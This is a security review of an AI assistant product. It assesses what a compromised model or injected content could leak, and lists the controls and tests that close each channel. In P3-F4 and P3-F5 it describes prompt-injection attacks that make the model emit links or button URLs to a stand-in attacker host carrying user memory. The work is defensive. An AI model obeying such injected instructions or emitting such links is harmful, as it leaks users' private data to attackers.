# V3 Phase 3 — Security Completion (assume-breach pass)

Branch: `integration/v3-foundation`, on top of the integrated foundation
(`0e9a31e` Phase 0 + `f9a1fa2` Phase 1 + `ff55c27` Phase 2 + `a711181` Phase 3 + `44d8f32`
integration).

The earlier passes answered *"are the known vulnerabilities fixed?"*. This one asks the harder
question: **if one component is compromised, does the architecture still hold?**

---

## 1. Assume-breach results

### Assume the AI is compromised

| Can it… | Answer | Why |
| --- | --- | --- |
| read another user's data | **No** | Every data read is scoped by the request-scoped Supabase client under RLS; `memoryService` is the single gateway and every caller passes a session-derived id. |
| call an arbitrary tool | **No** | `AI_TOOLS` is a closed registry a test checks against the route. |
| construct arbitrary tool arguments | **Yes, and it does not matter** | Arguments are the model's job. Ownership, scope and the decision to proceed are not: `runAiWriteAction` derives the actor from the verified session. |
| reach an arbitrary URL server-side | **No** | No tool exposes a URL or host parameter — verified across all ten schemas. Outbound fetches go through `safeFetch`/`addressPolicy`. |
| **exfiltrate through an image** | **No** | P3-F2. |
| **exfiltrate through a link** | **No — closed this pass** | P3-F4. |
| **exfiltrate through a button or a plan** | **No — closed this pass** | P3-F5. |
| exfiltrate through telemetry | **No** | `ALLOWED_PAYLOAD_KEYS`; the model writes no telemetry field. |
| cause a financial side effect | **No** | There is no payment tool. Prices are guarded deterministically. |

### Assume retrieved content is malicious

It can say anything, and the model may read it. It cannot forge a role (tool output is
JSON-serialised `tool`-role data — P3-S4), cannot reach a privileged decision (authorization is
outside the model), and — after this pass — **cannot get a URL of its choosing in front of the
user through any of the three channels that render one**.

### Assume the client is malicious

It cannot forge identity (JWT verified), IP (platform headers), ownership (server-derived), or
permissions. It *can* send a conversation history containing arbitrary URLs — deliberately
allowed, because a malicious client exfiltrating to itself already holds the data; the attack
that matters is injected content steering an **honest** client, whose history contains only what
this guard already approved. Pinned by a test so it stays a decision rather than an accident.

---

## 2. New findings this pass

### P3-F4 · A link the model invented is an exfiltration channel — High

- **Attack.** Injected content instructs the model to append
  `[Xem thêm kết quả](https://attacker/?d=<memory>)`. The label is the exact affordance this
  product shows on nearly every turn, so the disguise is supplied by the product itself. The
  client renders it `<a href>`; bare URLs are auto-linked too, so omitting the brackets was a
  bypass.
- **Why P3-F2's rule could not simply be extended.** The rulebook *requires* the model to write
  links — rules 4, 9, 12 ("COPY CHINH XAC nguyen van tung 'url'"), 13, 14. Deleting model-written
  links would delete the product.
- **Control.** The property the rulebook states and never enforced: **a URL is publishable only
  if it appears verbatim in this turn's tool results, or in a reply we already published.** That
  is what defeats exfiltration — an attacker can get their URL into a search result, but not the
  victim's data into it, because the tool result is fixed before the model sees the user's
  memory. Appending a payload breaks the match, and appending a payload is the whole attack.
- **Tests.** `linkEgressBoundary.test.ts` — 5 exfiltration cases (markdown, bare, no-tool turn,
  data appended to a legitimate URL, split across deltas) and 6 product cases (rules 9/12/13/14,
  order links, a repeated link from history).

### P3-F5 · Structured blocks carry URLs outside the prose guard — High

- **Attack.** `[CTA_BUTTONS]{"buttons":[{"label":…,"url":…}]}` is **model-authored**, and the
  client renders `href={btn.url}` — a styled call to action is clicked far more readily than a
  URL in a sentence. `[TAPPY_PLAN]` carries `maps_link` and `booking_link` per item, rendered the
  same way by `TripPlanCard`. Both bypass a prose-level rule entirely.
- **Control.** These URLs are *constructed* by the model from a place or product name, so a
  verbatim match is impossible. The **destination** is what is constrained: a platform the
  rulebook itself names (`shopee.vn`, `booking.com`, `google.com`, …) or a URL this turn produced.
  Exfiltration needs the data to reach a host the attacker controls; a query string on shopee.vn
  is worth nothing to them.
- **Side effect worth noting:** a relative URL has no host and satisfies neither half, so
  `type:"internal_booking"` + `router.push(btn.url)` is now blocked — enforcing the prompt's own
  ⛔ LUAT TOI THUONG rule in code for the first time.

### 🚨 A regression this pass caused and caught

The first version of P3-F4 ran the bare-URL pass over **CTA JSON** and deleted the `url` of every
button on a live turn, leaving `…"url":"`. Found with a probe, not by reasoning — and the
codebase had already written the rule I broke: *"Structured, computer-parsed blocks … we must
NEVER splice image markdown inside them."* Prose rules now stop at `earliestMarker`, and
`linkEgressBoundary.test.ts` carries the "platforms still work" case so it cannot come back.
Mutation MI11 fails when the separation is removed.

---

## 3. Egress channel inventory

| Channel | Status | Control |
| --- | --- | --- |
| Markdown image | Closed | P3-F2 ownership oracle |
| Markdown link | Closed | P3-F4 provenance |
| Bare URL in prose | Closed | P3-F4 provenance |
| CTA button `url` | Closed | P3-F5 host policy |
| Plan `maps_link` / `booking_link` | Closed | P3-F5 host policy |
| In-app navigation (`router.push`) | Closed | P3-F5 (relative URL has no host) |
| HTML | Closed | `escapeHtml` before any tag is built |
| Server-side fetch | Closed | `safeFetch` + `addressPolicy`, no model-controlled host |
| Tool query strings | **Open by design, Low** | The model can put text into a query to a *fixed* third party (Serper/Google). The attacker cannot read those logs, so it is a privacy consideration, not an exfiltration path. Documented, not fixed. |
| Telemetry / logs | Closed | `ALLOWED_PAYLOAD_KEYS`; drain goes to the log sink, never a response |
| Error messages | Closed | Tools return localized product messages; exception text goes to server logs only |

---

## 4. Fail-closed analysis

| Failure | Behaviour | Assessment |
| --- | --- | --- |
| Distributed rate-limit store unreachable | Fails **closed** when configured; falls back to in-process when not configured | Correct — never worse than what shipped |
| Memory read fails | Returns `null` | Fail-closed on data |
| Audit write fails | Returns `false`, action proceeds | **Deliberate.** The action already happened; failing the response would not un-do it. P3-F1 removed the case where *input* could cause the failure — the remaining case is infrastructure, and it is logged. |
| Tool returns malformed JSON | Caught, frame skipped | Safe |
| Model emits malformed structured JSON | Guard leaves the block untouched | Correct: the client parses with the same `JSON.parse` and will ignore it too |
| A URL cannot be judged (no tool result, not in history) | **Removed** | Fail-closed. Cost is a lost link, not a leak. |
| Anonymous quota RPC unavailable | Falls back to the cookie cap, mirrored | Documented dual-authority closure |

---

## 5. Data access map

| Source | Owner | AI accessible | Minimisation |
| --- | --- | --- | --- |
| `user_memory` | user | Yes, fenced | `MEMORY_COLUMNS` subset; `buildMemoryBlock` narrows further per forced tool |
| `user_preferences` | user | Yes, fenced | Four columns |
| Calendar | user (third parties can write) | Yes, fenced | Week window only |
| GPS / address label | user | Yes, fenced | Coordinates rounded to 5dp; label capped at 120 chars |
| Tool results | third party | Yes, as `tool`-role JSON | Per-tool shape |
| `audit_log`, telemetry | system | **No** | Not in any prompt |
| Auth tokens, service keys | system | **No** | Architecture rule forbids adapters reading them; no prompt path |

---

## 6. Remaining risks

1. **P3-D2 — CSP `img-src … https:`.** Still permits any https host. The channel is closed at
   the boundary that knows which URLs are legitimate; the CSP is missing defence-in-depth.
   Needs the real place-photo CDN inventory.
2. **Live-path guards have no real-device smoke test.** Byte-identical when no URL or marker is
   present, and the whole suite passes, but this is the most latency-sensitive code in the app.
3. **`GCP_LOGGING_ENABLED` is off in production**, so the security and cost telemetry drains
   into nothing. Owner action.
4. **Tool query strings** reach fixed third parties with model-chosen text (see §3).
5. **P3-D1 / P3-D3** remain as previously recorded, re-evaluated and unchanged.

---

## 7. The mutation harness itself was a finding

`scripts/p3-mutation.sh` drove `perl -0pi -e` substitutions and validated nothing about its
anchors. When the P3-F4/F5 work refactored `streamEnrichment.ts`, three anchors stopped
matching — and a substitution that matches nothing is a no-op, so the suite passed and the
harness printed **NOT DETECTED** for three guards that were working perfectly.

That is the worse direction of failure. A harness that can silently stop mutating will just as
happily report a pass for a protection that has been deleted.

It is replaced by `docs/security/v3-phase3-mutations.mjs`: plain string replacement (no regex,
no shell escaping) with every anchor asserted to occur EXACTLY ONCE. A stale anchor is now a
loud `ANCHOR!` line, not a false verdict. Re-run with correct anchors, 9 of 10 were killed —
and the tenth, **M7, genuinely survived**: no test covered a reply that stops MID-image-token,
where the bare-URL pass deliberately skips a URL preceded by `](` and the image regex needs a
closing `)`. That case is reachable on `finishReason: "length"`. The test was added; M7 is now
killed.
